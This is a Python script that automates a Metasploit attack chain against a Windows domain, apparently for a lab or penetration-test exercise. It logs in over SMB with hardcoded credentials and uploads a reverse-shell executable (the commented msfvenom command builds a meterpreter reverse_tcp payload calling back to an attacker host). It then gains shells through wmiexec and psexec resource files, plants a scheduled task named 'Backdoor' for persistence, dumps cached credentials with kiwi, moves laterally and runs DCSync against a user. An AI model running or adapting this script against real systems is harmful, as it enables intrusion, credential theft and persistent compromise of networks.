#!/usr/bin/python3
import pexpect
import os
import time

print("INITIALISING")
print("WELCOME")

#msfvenom
#process = pexpect.spawn('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > shell.exe') 
#process.expect('Final')
#print ("MSFVENOM SCRIPT COMPLETE. NAME=shell.exe")
print("MSFVENOM SCRIPT ALREADY EXISTS")

# Start Metasploit
msf_script = pexpect.spawn('msfconsole', encoding='utf-8')
fout = open('Metascript_logs.txt', 'w', encoding='utf-8')
msf_script.logfile = fout

# Wait for Metasploit prompt
msf_script.expect('msf6')
print("SKIPPING SMB LOGIN - TIME CONSTRAINTS")
print("RUNNING WMIEXEC")

# Running resource1.rc
msf_script.sendline('resource resource1.rc')
msf_script.expect('auxiliary', timeout=120)
print("WMIEXEC COMPLETED - SUCCESS")
print(msf_script.after)

print("BEGINNING SMBCLIENT")
# SMB client put shell.exe
msf_script.sendline('smbclient //172.22.117.20/C$ -U megacorpone/tstark')
msf_script.expect('password')
print("ENTERING PASSWORD")
msf_script.sendline('Password!')
msf_script.expect('smb')
print("PUTTING SHELL.EXE")
print(msf_script.after)

msf_script.sendline('put shell.exe')
msf_script.expect('smb')
print("COMPLETE - EXITING")
print(msf_script.after)

msf_script.sendline('exit')
msf_script.expect('auxiliary')
print("SHELL.EXE SUCCESSFULLY PLACED - SMBCLIENT SUCCESS")
print(msf_script.after)


def run_resource(msf_script, resource_name, max_retries=3, retry_delay=10):
    retries = 0
    while retries < max_retries:
        msf_script.sendline(f'resource {resource_name}.rc')
        index = msf_script.expect_exact(['meterpreter >', 'exploit:', 'This session has expired', pexpect.TIMEOUT, pexpect.EOF], timeout=360)

        if index == 0:
            print(f"{resource_name.upper()} COMPLETED - ATTACK SUCCESS")
            print(msf_script.after)

            # Check if the meterpreter shell is presented
            msf_script.expect_exact('meterpreter >', timeout=360)
            msf_script.sendline('background')
            msf_script.expect_exact('msf6', timeout=360)
            print("BACKGROUND SUCCESS")
            print(msf_script.after)
            return

        elif index == 1:
            print(f"{resource_name.upper()} RESTARTING - RETRYING {retries + 1}/{max_retries}")
            time.sleep(retry_delay)
            retries += 1
            continue

        elif index == 2:
            print(f"{resource_name.upper()} SESSION TIMEOUT - REATTEMPTING {resource_name.upper()}.RC")
            continue

        elif index == 3:
            print("EXPECTED SENDLINE NOT FOUND")
            print(f"{resource_name.upper()} RESTARTING - RETRYING {retries + 1}/{max_retries}")
            time.sleep(retry_delay)
            retries += 1
            continue

        elif index == 4:
            print(f"{resource_name.upper()} RESTARTING - RETRYING {retries + 1}/{max_retries}")
            time.sleep(retry_delay)
            retries += 1
            continue


run_resource(msf_script, 'resource2')
print("RESOURCE 2 COMPLETED - ATTACK SUCCESS")
print(msf_script.after)

msf_script.sendline('background')
msf_script.expect('msf6')

print("BACKGROUND SUCCESS")
print(msf_script.after)

print("BEGINNING PERSISTENCE SERVICES")
# Running resource3.rc
run_resource(msf_script, 'resource3')
print("SUCCESS - REQUESTING SHELL")
print(msf_script.after)

msf_script.sendline('shell')
msf_script.expect('C:\\ ', timeout=120)

print("SHELL ESTABLISHED - CREATING SCHEDULED TASK")
print(msf_script.after)

msf_script.sendline('schtasks /create /f /tn Backdoor /SC ONCE /ST 00:00 /TR "C:\shell.exe"')
msf_script.expect('C:\\ ')

print("SCHEDULED TASK CREATED SUCCESSFULLY - EXITING")
print(msf_script.after)

msf_script.sendline('exit')
msf_script.expect('meterpreter')

print(msf_script.after)

msf_script.sendline('exit')
msf_script.expect('exploit')

print("RESOURCE 3 COMPLETED - ATTACK SUCCESS")
print(msf_script.after)

print("BEGINNING PSEXEC")
# Running resource4.rc
run_resource(msf_script, 'resource4')
print("PSEXEC COMPLETED - ATTACK SUCCESS")
print(msf_script.after)

print("STARTING KIWI")
msf_script.sendline('load kiwi')
msf_script.expect('meterpreter')

msf_script.sendline('kiwi_cmd lsadump::cache')
msf_script.expect('meterpreter')

print("CACHE DUMP SUCCESS - EXITING KIWI")
print(msf_script.after)

msf_script.sendline('exit')
msf_script.expect('exploit')

print(msf_script.after)

print("STARTING LATERAL MOVEMENT")
# Running resource5.rc
run_resource(msf_script, 'resource5')
print(msf_script.after)

print("REQUESTING SYSINFO")
msf_script.sendline('sysinfo')
msf_script.expect('meterpreter')
print(msf_script.after)

print("SUCCESS - ENTERING SHELL")
msf_script.sendline('shell')
msf_script.expect('system32')
print(msf_script.after)

print("SHELL ESTABLISHED - REQUESTING USERS")
msf_script.sendline('net users')
msf_script.expect('system32')
print("USERS ESTABLISHED - EXITING - OPENING KIWI")
print(msf_script.after)

msf_script.sendline('exit')
msf_script.expect('meterpreter')
msf_script.sendline('load kiwi')
msf_script.expect('meterpreter')
print(msf_script.after)

print("KIWI LOADED - TESTING DCSYNC")
msf_script.sendline('dcsync_ntlm cdanvers')
msf_script.expect('meterpreter')

print("ATTACK SUCCESS - PROVEN VULNERABILITY - SHUTTING DOWN")

msf_script.close()
fout.close()

print("SCRIPT EXECUTION COMPLETED")
